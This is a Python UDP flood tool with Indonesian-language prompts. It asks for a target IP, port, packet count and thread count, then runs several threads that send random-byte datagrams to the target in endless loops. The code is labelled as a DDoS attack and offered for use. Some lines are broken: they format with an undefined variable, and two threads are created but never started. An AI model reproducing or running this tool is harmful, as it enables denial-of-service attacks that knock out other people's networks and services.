###################################################################################
# IMPORT MODULE
import os, sys, socket, threading, random
###################################################################################
# CLEAR
def clear():
	os.system('cls' if os.name=='nt' else 'clear')
###################################################################################
# MAIN MENU 
clear()
ip = str(input("\033[94m╔═══\033[91m[ Masukkan IP-nya ] •\n\033[94m╠══>\033[0m "))
port = int(input("\033[94m╠═══\033[91m[ Masukkan PORT-nya ] •\n\033[94m╠══>\033[0m "))
choice = str(input("\033[94m╠═══\033[91m[ Attack? y/n ] •\n\033[94m╠══>\033[0m "))
times = int(input("\033[94m╠═══\033[91m[ Masukkan PACKETs-nya ] •\n\033[94m╠══>\033[0m "))
threads = int(input("\033[94m╠═══\033[91m[ Masukkan THREADs-nya ] •\n\033[94m╠══>\033[0m "))
clear()
print("\033[94m")
###################################################################################
# ATTACK SENT

def attack():
	data = random._urandom(1025)
	i = random.choice(("[ # ]", "[ ! ]", "[ * ]", "[ $ ]", "[ • ]"))
	while True:
		try:
			s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
			addr = (str(ip),int(port))
			for x in range(times):
				s.sendto(data,addr)
			print(i +" Attack to ip > {} and port > {} ?!!".format(ip, port) %len(lsts))
		except:
			print("[ Down ] • Request time on ip > {} and port > {}".format(ip, port) %len(lsts))

def attack2():
	data = random._urandom(1800)
	i = random.choice(("[ # ]", "[ ! ]", "[ * ]", "[ $ ]", "[ • ]"))
	while True:
		try:
			s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
			addr = (str(ip),int(port))
			for x in range(times):
				s.sendto(data,addr)
			print(i +" Attack to ip > {} and port > {} ?!!".format(ip, port) %len(lsts))
		except:
			print("[ Down ] • Request time on ip > {} and port > {}".format(ip, port) %len(lsts))

def attack3():
	data = random._urandom(999)
	i = random.choice(("[ # ]", "[ ! ]", "[ * ]", "[ $ ]", "[ • ]"))
	while True:
		try:
			s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
			addr = (str(ip),int(port))
			for x in range(times):
				s.sendto(data,addr)
			print(i +" Attack to ip > {} and port > {} ?!!".format(ip, port) %len(lsts))
		except:
			print("[ Down ] • Request time on ip > {} and port > {}".format(ip, port) %len(lsts))

def attack4():
	data = random._urandom(818)
	i = random.choice(("[ # ]", "[ ! ]", "[ * ]", "[ $ ]", "[ • ]"))
	while True:
		try:
			s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
			addr = (str(ip),int(port))
			for x in range(times):
				s.sendto(data,addr)
			print(i +" Attack to ip > {} and port > {} ?!!".format(ip, port) %len(lsts))
		except:
			print("[ Down ] • Request time on ip > {} and port > {}".format(ip, port) %len(lsts))

###################################################################################
# START DDOS
for y in range(threads):
	if choice == 'y':
		th = threading.Thread(target = attack)
		th.start()
		th = threading.Thread(target = attack2)
		th.start()
		th = threading.Thread(target = attack3)
		th.start
		th = threading.Thread(target = attack4)
		th.start
	elif choice == 'n':
		print("\033[91m[ Bimzzx ] • CloseTheProgram")
		pass
